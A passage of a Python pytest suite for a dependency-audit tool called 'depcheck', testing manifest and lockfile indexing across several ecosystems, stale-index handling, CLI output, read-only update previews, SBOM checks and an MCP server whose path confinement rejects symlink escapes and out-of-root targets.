def test_conflicting_npm_locks_preserve_unknown_resolution_until_refresh(tmp_path):
    (tmp_path / "package.json").write_text('{"dependencies":{"tool":"^1.0.0"}}')
    (tmp_path / "app.js").write_text('import "tool";\n')
    (tmp_path / "package-lock.json").write_text(
        '{"packages":{"node_modules/tool":{"version":"1.0.0"}}}'
    )
    yarn = tmp_path / "yarn.lock"
    yarn.write_text("# yarn lock\n")
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    context = service.repository_context()
    assert not context["complete"]
    assert "resolution.package-manager-ambiguous" in context["incomplete_reasons"]
    assert service.explain_dependency("tool")["resolved_versions"] == []
    command = [
        "scan",
        str(tmp_path),
        "--offline",
        "--fail-on",
        "hygiene-incomplete",
        "--format",
        "json",
    ]
    assert main(command) == 1
    yarn.unlink()
    assert service.repository_context()["stale"]
    service.index_repository()
    assert service.explain_dependency("tool")["resolved_versions"] == ["1.0.0"]
    assert main(command) == 0


def test_rejected_workflow_symlink_is_hashed_without_reading_outside(tmp_path):
    root = tmp_path / "repo"
    root.mkdir()
    (root / "requirements.txt").write_text("ruff==0.14.0\n")
    workflows = root / ".github" / "workflows"
    workflows.mkdir(parents=True)
    outside = tmp_path / "private.yml"
    outside.write_text("jobs: SECRET OUTSIDE DATA")
    workflow = workflows / "quality.yml"
    try:
        workflow.symlink_to(outside)
    except OSError:
        pytest.skip("symlinks unavailable")
    service = DependencyAgentService(root)
    service.index_repository()
    context = service.repository_context()
    assert not context["stale"]
    assert not context["complete"]
    assert context["coverage"]["uncovered"]
    assert "SECRET OUTSIDE DATA" not in json.dumps(context)
    workflow.unlink()
    assert service.repository_context()["stale"]


def test_workflow_directory_symlink_never_hashes_descendant_data(tmp_path, monkeypatch):
    from depcheck.indexing import indexer

    root = tmp_path / "repo"
    root.mkdir()
    (root / "requirements.txt").write_text("ruff==0.14.0\n")
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "workflows").write_text("private outside file")
    try:
        (root / ".github").symlink_to(outside, target_is_directory=True)
    except OSError:
        pytest.skip("symlinks unavailable")
    original = indexer._file_digest

    def bounded_digest(path):
        assert path.resolve().is_relative_to(root), "hashed outside audit root"
        return original(path)

    monkeypatch.setattr(indexer, "_file_digest", bounded_digest)
    service = DependencyAgentService(root)
    service.index_repository()
    assert not service.repository_context()["complete"]
    assert not service.repository_context()["stale"]


@pytest.mark.parametrize("filtered", [False, True])
def test_cargo_legacy_index_retains_edition_scope_and_read_only_refresh(
    tmp_path, filtered
):
    manifest = tmp_path / "Cargo.toml"
    text = (
        '[package]\nname="app"\nversion="0.1.0"\nedition="2021"\n'
        '[dev_dependencies]\nfoo="1"\n'
    )
    manifest.write_text(text)
    service = DependencyAgentService(tmp_path)
    selection = {"ecosystems": ["Cargo"]} if filtered else {}
    service.index_repository(**selection)
    cache = tmp_path / ".depcheck/index.sqlite3"
    before = (cache.read_bytes(), cache.stat().st_mtime_ns)
    result = service.explain_dependency(
        "foo", ecosystem="Cargo", project_id="cargo:cargo:."
    )
    declaration = result["declarations"][0]
    assert declaration["scope"] == "development" and declaration["kind"] == "direct"
    assert declaration["location"]["line"] == 6
    assert declaration["metadata"]["legacy_section"]["status"] == "accepted"
    assert result["resolved_versions"] == [] and not result["usage_complete"]
    assert before == (cache.read_bytes(), cache.stat().st_mtime_ns)
    stat = manifest.stat()
    manifest.write_text(text.replace('edition="2021"', 'edition="2024"'))
    import os

    os.utime(manifest, ns=(stat.st_atime_ns, stat.st_mtime_ns))
    assert service.repository_context()["stale"]
    with pytest.raises(RuntimeError, match="stale"):
        service.explain_dependency("foo", ecosystem="Cargo")
    assert before == (cache.read_bytes(), cache.stat().st_mtime_ns)
    service.index_repository(**selection)
    result = service.explain_dependency("foo", ecosystem="Cargo")
    assert result["declarations"][0]["kind"] == "configuration"
    assert (
        result["declarations"][0]["metadata"]["legacy_section"]["status"] == "rejected"
    )
    assert not result["evidence_complete"]


@pytest.mark.parametrize("filtered", [False, True])
def test_cargo_inventory_queries_and_lock_freshness(tmp_path, filtered):
    (tmp_path / "Cargo.toml").write_text(
        '[package]\nname="demo"\nversion="0.1.0"\n[dependencies]\nfoo="1"\n'
    )
    lock = tmp_path / "Cargo.lock"
    lock_text = (
        'version = 4\n[[package]]\nname="foo"\nversion="1.2.3"\n'
        'source="registry+https://github.com/rust-lang/crates.io-index"\n'
    )
    lock.write_text(lock_text)
    source = tmp_path / "lib.rs"
    source.write_text("use foo::Thing;\n")
    service = DependencyAgentService(tmp_path)
    selection = {"ecosystems": ["Cargo"]} if filtered else {}
    service.index_repository(**selection)
    result = service.explain_dependency(
        "foo", ecosystem="Cargo", project_id="cargo:cargo:."
    )
    assert result["resolved_versions"] == ["1.2.3"]
    assert result["usages"][0]["reference"] == "foo"
    assert result["usages"][0]["mapping_confidence"] == "inferred"
    assert result["usages"][0]["scope"] == "unknown"
    assert result["usages"][0]["location"]["line"] == 1
    assert not result["usage_complete"]
    assert not result["evidence_complete"]
    assert service.dependency_impact("foo", ecosystem="Cargo")["usage_count"] == 1
    assert not service.repository_context()["stale"]
    from depcheck.path_policy import default_index_path

    cache = default_index_path(tmp_path)
    cache_before = (cache.read_bytes(), cache.stat().st_mtime_ns)
    source.write_text("// source changed\nuse foo::Other;\n")
    assert service.repository_context()["stale"]
    with pytest.raises(RuntimeError, match="stale"):
        service.explain_dependency("foo", ecosystem="Cargo")
    assert (cache.read_bytes(), cache.stat().st_mtime_ns) == cache_before
    lock.write_text(lock_text.replace("1.2.3", "1.2.4"))
    assert service.repository_context()["stale"]
    service.index_repository(**selection)
    assert service.explain_dependency("foo", ecosystem="Cargo")[
        "resolved_versions"
    ] == ["1.2.4"]
    assert (
        service.explain_dependency("foo", ecosystem="Cargo")["usages"][0]["location"][
            "line"
        ]
        == 2
    )


@pytest.mark.parametrize("ecosystem", ["PyPI", "npm", "Maven"])
def test_manifest_positions_survive_cached_explain_and_refresh(tmp_path, ecosystem):
    if ecosystem == "PyPI":
        manifest = tmp_path / "pyproject.toml"
        text = '[project]\ndependencies = [\n    "requests==2.31.0",\n]\n'
        package, project_id, line, column = "requests", "pypi:python:.", 3, 5
    elif ecosystem == "npm":
        manifest = tmp_path / "package.json"
        text = '{\n  "dependencies": {\n    "requests": "1.0.0"\n  }\n}\n'
        package, project_id, line, column = "requests", "npm:npm:.", 3, 5
    else:
        manifest = tmp_path / "pom.xml"
        text = "<project>\n  <dependencies>\n    <dependency><groupId>example</groupId><artifactId>requests</artifactId><version>1.0.0</version></dependency>\n  </dependencies>\n</project>\n"
        package, project_id, line, column = "example:requests", "maven:maven:.", 3, 5
    manifest.write_text(text)
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    for _ in range(2):
        service.index_repository()
        explanation = service.explain_dependency(
            package, ecosystem=ecosystem, project_id=project_id
        )
        assert explanation["declarations"][0]["location"] == {
            "path": manifest.name,
            "line": line,
            "column": column,
        }
    manifest.write_text("\n" + text)
    assert service.repository_context()["stale"]
    service.index_repository()
    assert (
        service.explain_dependency(package, ecosystem=ecosystem, project_id=project_id)[
            "declarations"
        ][0]["location"]["line"]
        == line + 1
    )


def test_explanations_and_impacts_retain_incomplete_usage_coverage(tmp_path):
    (tmp_path / "package.json").write_text('{"dependencies":{"component-lib":"1.0.0"}}')
    (tmp_path / "App.astro").write_text("<div>{component}</div>\n")
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    query = service.query_dependencies("component-lib")
    assert query["dependencies"][0]["usage_complete"] is False
    explanation = service.explain_dependency("component-lib")
    assert explanation["usages"] == []
    assert explanation["usage_complete"] is False
    assert explanation["evidence_complete"] is False
    impact = service.dependency_impact("component-lib")
    assert impact["usage_count"] == 0
    assert impact["usage_complete"] is False
    assert impact["evidence_complete"] is False


def test_scan_cli_uses_the_canonical_schema(
    tmp_path: Path,
    capsys,
) -> None:
    make_python_project(tmp_path)

    exit_code = main(
        [
            "scan",
            str(tmp_path),
            "--no-security",
            "--format",
            "json",
        ]
    )

    payload = json.loads(capsys.readouterr().out)
    assert exit_code == 0
    assert payload["schema"] == "depcheck.scan.v1"
    assert payload["summary"]["status"] == "incomplete"
    assert payload["capabilities"]["security"]["state"] == "skipped"


def test_index_query_and_update_preview_share_one_service(
    tmp_path: Path,
    capsys,
) -> None:
    make_python_project(tmp_path)

    assert main(["index", str(tmp_path)]) == 0
    capsys.readouterr()
    assert (
        main(
            [
                "query",
                str(tmp_path),
                "requests",
                "--ecosystem",
                "PyPI",
                "--project",
                "pypi:python:.",
            ]
        )
        == 0
    )
    query = json.loads(capsys.readouterr().out)
    assert query["dependencies"][0]["package"] == "requests"

    preview = DependencyAgentService(tmp_path).plan_dependency_updates(
        {"requests": "==2.32.4"},
        ecosystem="PyPI",
        project_id="pypi:python:.",
    )
    assert preview["read_only"] is True
    assert "requests==2.32.4" in preview["plans"][0]["preview"]
    assert (tmp_path / "requirements.txt").read_text(encoding="utf-8") == (
        "requests==2.31.0\n"
    )


@pytest.mark.filterwarnings("ignore:Field 'lifespan' has an incomplete definition")
def test_mcp_server_exposes_the_dependency_capability_set(
    tmp_path: Path,
) -> None:
    make_python_project(tmp_path)
    scanned = DependencyAgentService(tmp_path).scan_repository()
    assert scanned["schema"] == "depcheck.scan.v1"
    assert scanned["capabilities"]["security"]["state"] == "skipped"
    assert scanned["context"]["stale"] is False
    assert scanned["truncated"] is False

    server = create_server(allowed_roots=(tmp_path,))
    tool_definitions = asyncio.run(server.list_tools())
    tool_names = {tool.name for tool in tool_definitions}
    for tool in tool_definitions:
        assert tool.annotations is not None
        assert tool.annotations.openWorldHint is (
            tool.name == "verify_registry_package"
        )
        assert tool.annotations.readOnlyHint is (
            tool.name not in {"index_repository", "scan_repository"}
        )

    assert tool_names == {
        "compare_dependency_snapshots",
        "dependency_impact",
        "explain_dependency",
        "index_repository",
        "inspect_dependency_sbom",
        "inspect_cmake_model",
        "plan_dependency_updates",
        "query_dependencies",
        "repository_context",
        "scan_repository",
        "inspect_evidence",
        "reevaluate_vulnerabilities",
        "analyze_python_calls",
        "export_evidence",
        "compare_inventories",
        "compare_package_behavior",
        "compare_package_names",
        "verify_registry_package",
    }


def test_cli_honors_configured_exit_policy_and_reports_evaluation(
    tmp_path: Path, capsys
) -> None:
    (tmp_path / ".depcheck.toml").write_text(
        'fail-on = ["missing"]\n[import-map]\nrequests = "requests"\n'
    )
    (tmp_path / "app.py").write_text("import requests\n")
    assert main(["scan", str(tmp_path), "--offline", "--format", "json"]) == 1
    payload = json.loads(capsys.readouterr().out)
    assert payload["metadata"]["policy"]["status"] == "fail"
    assert payload["metadata"]["policy"]["fail_on"] == ["missing"]


def test_offline_disables_all_network_stages(
    tmp_path: Path, monkeypatch, capsys
) -> None:
    def no_network(*args, **kwargs):
        pytest.fail("offline scan attempted a network request")

    monkeypatch.setattr("requests.Session.request", no_network)
    make_python_project(tmp_path)
    (tmp_path / ".depcheck.toml").write_text("compatibility = true\n")
    assert main(["scan", str(tmp_path), "--offline", "--compatibility"]) == 0
    capsys.readouterr()
    DependencyAgentService(tmp_path).scan_repository()


def test_explain_matches_exact_package_before_applying_result_limit(
    tmp_path: Path,
) -> None:
    (tmp_path / "requirements.txt").write_text(
        "a-requests==1\nb-requests==1\nrequests==2.31.0\n"
    )
    service = DependencyAgentService(tmp_path, max_results=1)
    service.index_repository()
    result = service.explain_dependency("requests")
    assert result["package"] == "requests"


def test_query_paginates_all_matches_after_filtering(tmp_path: Path) -> None:
    packages = [f"package-{index:03d}" for index in range(65)]
    (tmp_path / "requirements.txt").write_text(
        "\n".join(f"{package}==1.0" for package in packages)
    )
    service = DependencyAgentService(tmp_path, max_results=7)
    service.index_repository()
    collected = []
    offset = 0
    while True:
        page = service.query_dependencies(limit=20, offset=offset)
        assert page["offset"] == offset
        assert page["count"] <= 7
        collected.extend(item["package"] for item in page["dependencies"])
        if not page["truncated"]:
            assert page["next_offset"] is None
            break
        assert page["next_offset"] == offset + page["count"]
        offset = page["next_offset"]
    assert collected == packages
    filtered = service.query_dependencies(
        "package-05", ecosystem="PyPI", project_id="pypi:python:.", limit=3, offset=2
    )
    assert [item["package"] for item in filtered["dependencies"]] == packages[52:55]
    assert filtered["next_offset"] == 5
    assert service.query_dependencies(offset=100)["dependencies"] == []
    with pytest.raises(ValueError, match="offset"):
        service.query_dependencies(offset=-1)


def test_cli_query_exposes_pagination(tmp_path: Path, capsys) -> None:
    (tmp_path / "requirements.txt").write_text("alpha==1\nbeta==1\ngamma==1\n")
    assert main(["index", str(tmp_path)]) == 0
    capsys.readouterr()
    assert main(["query", str(tmp_path), "--limit", "1", "--offset", "1"]) == 0
    payload = json.loads(capsys.readouterr().out)
    assert [item["package"] for item in payload["dependencies"]] == ["beta"]
    assert payload["next_offset"] == 2
    assert main(["query", str(tmp_path), "--offset", "-1"]) == 2
    assert "offset" in capsys.readouterr().err


def test_unqualified_explain_preserves_non_python_package_names(tmp_path: Path) -> None:
    (tmp_path / "go.mod").write_text(
        "module example.com/app\nrequire example.com/Some_Module v1.2.3\n"
    )
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    assert service.explain_dependency("example.com/Some_Module")["package"] == (
        "example.com/Some_Module"
    )


def test_update_preview_respects_excluded_directories(tmp_path: Path) -> None:
    make_python_project(tmp_path)
    (tmp_path / "generated").mkdir()
    (tmp_path / "generated" / "requirements.txt").write_text("requests==2.30.0\n")
    (tmp_path / ".depcheck.toml").write_text('excluded-directories = ["generated"]\n')
    plans = DependencyAgentService(tmp_path).plan_dependency_updates(
        {"requests": "2.32.4"}
    )
    assert [plan["file"] for plan in plans["plans"]] == ["requirements.txt"]


@pytest.mark.parametrize(
    "hash_suffix", [" --hash=sha256:abc", " \\\n    --hash=sha256:abc"]
)
def test_update_preview_does_not_retain_hashes_for_another_version(
    tmp_path: Path, hash_suffix: str
) -> None:
    from depcheck.compatibility.safe_updater import RequirementsUpdater

    path = tmp_path / "requirements.txt"
    content = f"requests==2.31.0{hash_suffix}\n"
    path.write_text(content)
    with pytest.raises(ValueError, match="hash"):
        RequirementsUpdater(tmp_path).plan(path, {"requests": "2.32.4"})
    assert path.read_text() == content


def test_mcp_stdio_calls_all_tools_and_rejects_unapproved_root(tmp_path: Path) -> None:
    from mcp import ClientSession, StdioServerParameters
    from mcp.client.stdio import stdio_client

    make_python_project(tmp_path)

    async def exercise():
        server = StdioServerParameters(
            command=sys.executable,
            args=mcp_stdio_arguments("--allow-root", str(tmp_path)),
        )
        async with stdio_client(server) as (read, write):
            async with ClientSession(read, write) as session:
                await session.initialize()
                calls = [
                    ("index_repository", {}),
                    ("scan_repository", {}),
                    ("repository_context", {}),
                    ("query_dependencies", {"query": "requests"}),
                    ("explain_dependency", {"package": "requests"}),
                    ("dependency_impact", {"package": "requests"}),
                    ("plan_dependency_updates", {"updates": {"requests": "2.32.4"}}),
                ]
                for name, arguments in calls:
                    result = await session.call_tool(name, arguments)
                    assert not result.isError, (name, result)
                    payload = json.loads(result.content[0].text)
                    assert "error" not in payload, (name, payload)
                rejected = await session.call_tool(
                    "index_repository", {"project_root": str(tmp_path.parent)}
                )
                assert rejected.isError

    async def bounded_exercise():
        async with asyncio.timeout(20):
            await exercise()

    asyncio.run(bounded_exercise())
    assert (tmp_path / "requirements.txt").read_text() == "requests==2.31.0\n"


def test_client_roots_decode_file_uri_once(tmp_path: Path) -> None:
    from depcheck.agent.mcp_server import _client_root_policy

    root = tmp_path / "repo%2F with space"
    root.mkdir()

    async def list_roots():
        return SimpleNamespace(roots=[SimpleNamespace(uri=root.as_uri())])

    context = SimpleNamespace(
        request_context=SimpleNamespace(session=SimpleNamespace(list_roots=list_roots))
    )
    policy = asyncio.run(_client_root_policy(context))
    assert policy.allowed_roots == (root.resolve(),)


def test_client_roots_use_native_windows_uri_conversion(tmp_path: Path, monkeypatch):
    import nturl2path

    uri = "file:///C:/workspace/repo%252Fwith%20space"
    converted = []

    def native_conversion(path):
        decoded = nturl2path.url2pathname(path)
        converted.append(decoded)
        assert decoded == r"C:\workspace\repo%2Fwith space"
        return str(tmp_path)

    monkeypatch.setattr(mcp_server, "url2pathname", native_conversion, raising=False)

    async def list_roots():
        return SimpleNamespace(roots=[SimpleNamespace(uri=uri)])

    context = SimpleNamespace(
        request_context=SimpleNamespace(session=SimpleNamespace(list_roots=list_roots))
    )
    policy = asyncio.run(mcp_server._client_root_policy(context))
    assert policy.allowed_roots == (tmp_path.resolve(),)
    assert len(converted) == 1


def test_mcp_stdio_uses_client_roots_without_fixed_allowlist(tmp_path: Path) -> None:
    from mcp import ClientSession, StdioServerParameters
    from mcp.client.stdio import stdio_client
    from mcp.types import ListRootsResult, Root

    root = tmp_path / "client repo%2F"
    root.mkdir()
    make_python_project(root)

    async def exercise():
        async def list_roots(context):
            return ListRootsResult(roots=[Root(uri=root.as_uri(), name="Repository")])

        server = StdioServerParameters(
            command=sys.executable,
            args=mcp_stdio_arguments(),
            env={"DEPCHECK_ALLOWED_ROOTS": ""},
        )
        async with stdio_client(server) as (read, write):
            async with ClientSession(
                read, write, list_roots_callback=list_roots
            ) as session:
                await session.initialize()
                result = await session.call_tool("index_repository", {})
                assert not result.isError, result
                result = await session.call_tool(
                    "query_dependencies", {"query": "requests"}
                )
                assert not result.isError, result
                payload = json.loads(result.content[0].text)
                assert payload["dependencies"][0]["resolved_version"] == "2.31.0"
                rejected = await session.call_tool(
                    "index_repository", {"project_root": str(tmp_path)}
                )
                assert rejected.isError

    async def bounded():
        async with asyncio.timeout(20):
            await exercise()

    asyncio.run(bounded())
    assert (root / "requirements.txt").read_text() == "requests==2.31.0\n"


def test_context_runtime_capabilities_match_registered_packs(tmp_path: Path) -> None:
    from depcheck.ecosystems import create_default_registry
    from depcheck.indexing import RepositoryIndex

    registry = create_default_registry()
    missing = RepositoryIndex(tmp_path).context()
    assert missing["runtime_capabilities"] == registry.runtime_capabilities()
    make_python_project(tmp_path)
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    context = service.repository_context()
    for project in context["projects"]:
        assert (
            set(project["supported_capabilities"])
            == registry.get(project["ecosystem"]).capabilities
        )
    assert "update_preview" in context["runtime_capabilities"]["PyPI"]
    assert "update_preview" not in context["runtime_capabilities"]["npm"]


@pytest.mark.parametrize(
    "manifest,content",
    [
        (
            "pyproject.toml",
            '[project]\nname="demo"\nversion="1"\ndependencies=["requests==2.31.0"]\n',
        ),
        ("package.json", '{"dependencies":{"requests":"1.0"}}'),
        ("requirements.txt", "requests @ https://example.org/requests.whl\n"),
    ],
)
def test_unsupported_update_target_has_diagnostic(
    tmp_path: Path, manifest: str, content: str
) -> None:
    (tmp_path / manifest).write_text(content)
    result = DependencyAgentService(tmp_path).plan_dependency_updates(
        {"requests": "2.32.4"}
    )
    assert result["plans"] == []
    assert any(d["code"] == "update.unsupported-target" for d in result["diagnostics"])
    assert (tmp_path / manifest).read_text() == content


def test_update_noop_and_partial_support_are_distinguished(tmp_path: Path) -> None:
    make_python_project(tmp_path)
    service = DependencyAgentService(tmp_path)
    noop = service.plan_dependency_updates({"requests": "2.31.0"})
    assert noop["plans"] == []
    assert noop["diagnostics"] == []
    partial = service.plan_dependency_updates({"requests": "2.32.4", "unknown": "1.0"})
    assert len(partial["plans"]) == 1
    assert len(partial["diagnostics"]) == 1
    assert "unknown" in partial["diagnostics"][0]["message"]


def test_precommit_scan_is_offline_with_compatibility_enabled(
    tmp_path: Path, monkeypatch, capsys
) -> None:
    import shlex

    import requests

    make_python_project(tmp_path)
    (tmp_path / ".depcheck.toml").write_text("security=true\ncompatibility=true\n")

    def reject_network(*args, **kwargs):
        pytest.fail("offline hook attempted network access")

    monkeypatch.setattr(requests.Session, "request", reject_network)
    hook = json.loads(
        (Path(__file__).resolve().parents[1] / ".pre-commit-hooks.yaml").read_text()
    )[0]
    command = shlex.split(hook["entry"])
    assert "--offline" in command
    assert main([*command[1:], str(tmp_path)]) == 0
    output = capsys.readouterr().out
    assert output
    (tmp_path / "app.py").write_text("import (\n")
    assert main([*command[1:], str(tmp_path)]) == 1


def test_explicit_unsupported_ecosystem_reports_diagnostic(tmp_path: Path) -> None:
    result = DependencyAgentService(tmp_path).plan_dependency_updates(
        {"left-pad": "1.3.0"}, ecosystem="npm"
    )
    assert result["error"]["code"] == "capability.unsupported"
    assert result["diagnostics"][0]["code"] == "capability.unsupported"


def test_add_missing_still_produces_a_supported_preview(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("")
    result = DependencyAgentService(tmp_path).plan_dependency_updates(
        {"requests": "2.32.4"}, add_missing=True
    )
    assert result["diagnostics"] == []
    assert result["plans"][0]["added"] == {"requests": "==2.32.4"}


@pytest.mark.parametrize(
    "command",
    [
        ["update", "requests=2.32.4", "--ecosystem", "npm"],
        ["update", "missing=1.0"],
        ["explain", "missing"],
        ["impact", "missing"],
    ],
)
def test_cli_service_errors_return_failure(
    tmp_path: Path, capsys, command: list[str]
) -> None:
    make_python_project(tmp_path)
    DependencyAgentService(tmp_path).index_repository()
    assert main([command[0], str(tmp_path), *command[1:]]) == 2
    payload = json.loads(capsys.readouterr().out)
    assert "error" in payload or payload["diagnostics"]


def test_stale_index_queries_require_refresh(tmp_path: Path) -> None:
    make_python_project(tmp_path)
    service = DependencyAgentService(tmp_path)
    service.index_repository()
    (tmp_path / "requirements.txt").write_text("requests==2.32.4\n")
    for query in (
        service.query_dependencies,
        service.explain_dependency,
        service.dependency_impact,
    ):
        with pytest.raises(RuntimeError, match="stale"):
            query("requests")
    service.index_repository()
    assert service.explain_dependency("requests")["resolved_version"] == "2.32.4"


def test_corrupt_index_is_a_cli_error_without_traceback(tmp_path: Path, capsys) -> None:
    (tmp_path / ".depcheck").mkdir()
    (tmp_path / ".depcheck" / "index.sqlite3").write_bytes(b"not a database")
    assert main(["context", str(tmp_path)]) == 2
    stderr = capsys.readouterr().err
    assert "database" in stderr
    assert "Traceback" not in stderr


def test_mcp_missing_extra_has_an_actionable_cli_error(monkeypatch, capsys) -> None:

    monkeypatch.setattr(mcp_server, "FastMCP", None)
    with pytest.raises(SystemExit) as exit_info:
        mcp_server.cli([])
    assert exit_info.value.code == 2
    error = capsys.readouterr().err
    assert "depcheck[agent]" in error
    assert "Traceback" not in error


def test_update_file_and_group_selection_share_service_semantics(tmp_path, capsys):
    make_python_project(tmp_path)
    manifest = tmp_path / "pyproject.toml"
    manifest.write_text(
        '[project]\ndependencies=["requests==2.30.0"]\n[project.optional-dependencies]\ntest=["requests==2.29.0"]\n'
    )
    original = {
        p.name: p.read_bytes() for p in [manifest, tmp_path / "requirements.txt"]
    }
    service = DependencyAgentService(tmp_path)
    result = service.plan_dependency_updates(
        {"requests": "2.32.4"}, target_file="pyproject.toml", group="optional:test"
    )
    assert result["plans"][0]["groups"] == ["optional:test"]
    assert "requests==2.30.0" in result["plans"][0]["preview"]
    assert "requests==2.32.4" in result["plans"][0]["preview"]
    assert (
        main(
            [
                "update",
                str(tmp_path),
                "requests=2.32.4",
                "--file",
                "pyproject.toml",
                "--group",
                "optional:test",
            ]
        )
        == 0
    )
    assert json.loads(capsys.readouterr().out) == result
    assert (
        service.plan_dependency_updates({"requests": "2.32.4"})["plans"][0]["file"]
        == "requirements.txt"
    )
    assert (
        service.plan_dependency_updates(
            {"requests": "2.32.4"}, target_file="requirements.txt"
        )["plans"][0]["file"]
        == "requirements.txt"
    )
    assert {
        p.name: p.read_bytes() for p in [manifest, tmp_path / "requirements.txt"]
    } == original


@pytest.mark.parametrize(
    "target",
    ["../outside.txt", "/tmp/outside.txt", "missing.txt", "excluded/requirements.txt"],
)
def test_explicit_update_target_respects_exclusions_and_root(tmp_path, target):
    make_python_project(tmp_path)
    (tmp_path / ".depcheck.toml").write_text('excluded-directories=["excluded"]\n')
    (tmp_path / "excluded").mkdir()
    (tmp_path / "excluded/requirements.txt").write_text("requests==1")
    with pytest.raises((ValueError, PermissionError)):
        DependencyAgentService(tmp_path).plan_dependency_updates(
            {"requests": "2"}, target_file=target
        )


def test_explicit_update_rejects_symlink_and_arbitrary_file(tmp_path):
    root = tmp_path / "root"
    root.mkdir()
    make_python_project(root)
    outside = tmp_path / "outside.txt"
    outside.write_text("requests==1")
    (root / "requirements-link.txt").symlink_to(outside)
    with pytest.raises(PermissionError):
        DependencyAgentService(root).plan_dependency_updates(
            {"requests": "2"}, target_file="requirements-link.txt"
        )
    (root / "notes.txt").write_text("requests==1")
    result = DependencyAgentService(root).plan_dependency_updates(
        {"requests": "2"}, target_file="notes.txt"
    )
    assert result["diagnostics"][0]["code"] == "update.unsupported-target"


@pytest.mark.parametrize(
    ("dependencies", "group", "version", "code"),
    [
        ('[project]\ndependencies=["requests==1"]', "project", "1", None),
        (
            '[project]\ndependencies=["requests @ https://example.org/r.whl"]',
            "project",
            "2",
            "update.unsupported-target",
        ),
        (
            '[project]\ndependencies=["requests==1"]\n[project.optional-dependencies]\ntest=["requests==1"]',
            None,
            "2",
            "update.ambiguous-target",
        ),
    ],
)
def test_pyproject_update_cli_distinguishes_noop_unsupported_and_ambiguous(
    tmp_path, capsys, dependencies, group, version, code
):
    (tmp_path / "pyproject.toml").write_text(dependencies)
    args = ["update", str(tmp_path), f"requests={version}", "--file", "pyproject.toml"]
    if group:
        args += ["--group", group]
    assert main(args) == (2 if code else 0)
    result = json.loads(capsys.readouterr().out)
    assert result["plans"] == []
    assert (
        ([d["code"] for d in result["diagnostics"]] == [code])
        if code
        else not result["diagnostics"]
    )
    assert (tmp_path / "pyproject.toml").read_text() == dependencies


def test_pyproject_update_parameters_in_mcp_schema(tmp_path):
    server = create_server()
    tool = next(
        t
        for t in asyncio.run(server.list_tools())
        if t.name == "plan_dependency_updates"
    )
    for name in ["target_file", "group"]:
        assert tool.inputSchema["properties"][name]["default"] is None
    assert tool.annotations.readOnlyHint is True
    assert tool.annotations.openWorldHint is False


def test_explicit_update_exclusion_cannot_be_bypassed_by_manifest_symlink(tmp_path):
    (tmp_path / ".depcheck.toml").write_text('excluded-directories=["vendor"]\n')
    (tmp_path / "vendor").mkdir()
    (tmp_path / "vendor/requirements.txt").write_text("requests==1\n")
    (tmp_path / "requirements.txt").symlink_to("vendor/requirements.txt")
    for target in ["vendor/requirements.txt", "requirements.txt"]:
        with pytest.raises(ValueError, match="excluded"):
            DependencyAgentService(tmp_path).plan_dependency_updates(
                {"requests": "2"}, target_file=target
            )


@pytest.mark.parametrize(
    ("token", "expected", "group"),
    [
        ("requests=2.32.4", "==2.32.4", None),
        ("requests==2.32.4", "==2.32.4", "project"),
        ("requests===2.32.4", "==2.32.4", None),
        ("requests====2.32.4", "===2.32.4", None),
    ],
)
def test_update_explicit_equality_specifiers_preserve_legacy_cli_semantics(
    tmp_path, capsys, token, expected, group
):
    (tmp_path / "pyproject.toml").write_text(
        '[project]\ndependencies=["requests==1"]\n'
    )
    args = ["update", str(tmp_path), token, "--file", "pyproject.toml"]
    if group is not None:
        args.extend(["--group", group])
    assert main(args) == 0
    result = json.loads(capsys.readouterr().out)
    assert result["plans"][0]["updated"] == {"requests": expected}


def test_component_update_does_not_follow_alias_into_another_owner(tmp_path):
    for name in ("a", "b"):
        component = tmp_path / name
        component.mkdir()
        (component / "pyproject.toml").write_text(
            f'[project]\nname="{name}"\nversion="1.0"\ndependencies=[]\n'
        )
    target = tmp_path / "b/requirements.txt"
    target.write_text("PyYAML==6.0.2\n")
    (tmp_path / "a/requirements.txt").symlink_to(target)
    result = DependencyAgentService(tmp_path).plan_dependency_updates(
        {"pyyaml": "6.0.3"}, project_id="pypi:python:a"
    )
    assert not result["plans"] and result["diagnostics"]
    assert target.read_text() == "PyYAML==6.0.2\n"


def test_snapshot_comparison_counts_repeated_declarations(tmp_path):

    requirements = tmp_path / "requirements.txt"
    for name, count in (("before.json", 2), ("after.json", 1)):
        requirements.write_text("PyYAML==6.0.2\n" * count)
        result = RepositoryScanner().scan(
            tmp_path, RepositoryScanOptions(security=False)
        )
        (tmp_path / name).write_text(json.dumps(result.to_dict()))
    result = DependencyAgentService(tmp_path).compare_dependency_snapshots(
        "before.json", "after.json"
    )
    assert result["counts"]["declarations_removed"] == 1
    assert result["counts"]["declarations_added"] == 0


def test_external_inventory_cli_and_pagination_are_read_only(tmp_path, capsys):
    bom = {
        "bomFormat": "CycloneDX",
        "specVersion": "1.7",
        "components": [
            {
                "bom-ref": str(i),
                "name": f"package-{i}",
                "purl": f"pkg:npm/package-{i}@1.0.0",
            }
            for i in range(3)
        ],
    }
    (tmp_path / "bom.json").write_text(json.dumps(bom))
    assert main(["sbom", str(tmp_path), "bom.json", "--limit", "2"]) == 0
    page = json.loads(capsys.readouterr().out)
    assert len(page["components"]) == 2 and page["next_offset"] == 2
    assert main(["sbom", str(tmp_path), "bom.json", "--offset", "2"]) == 0
    assert len(json.loads(capsys.readouterr().out)["components"]) == 1
    assert not (tmp_path / ".depcheck").exists()


@pytest.mark.parametrize(
    "field,value",
    [
        ("type", []),
        ("scope", "dev"),
        ("licenses", {}),
        ("licenses", [{"expression": ""}]),
        ("licenses", [{"license": {"id": 42}}]),
        ("licenses", [{"license": {}}]),
        ("licenses", [{"license": {"id": "MIT"}, "expression": "MIT"}]),
    ],
)
def test_sbom_rejects_malformed_component_assertions_at_cli_boundary(
    tmp_path, capsys, field, value
):
    component = {"name": "library", "purl": "pkg:npm/library@1.0.0", field: value}
    path = tmp_path / "bom.json"
    original = json.dumps(
        {"bomFormat": "CycloneDX", "specVersion": "1.7", "components": [component]}
    ).encode()
    path.write_bytes(original)
    assert main(["sbom", str(tmp_path), "bom.json"]) == 2
    output = capsys.readouterr()
    assert not output.out and "SBOM" in output.err
    assert path.read_bytes() == original and not (tmp_path / ".depcheck").exists()


def test_dependency_origins_keep_versions_instances_and_multiple_roots(
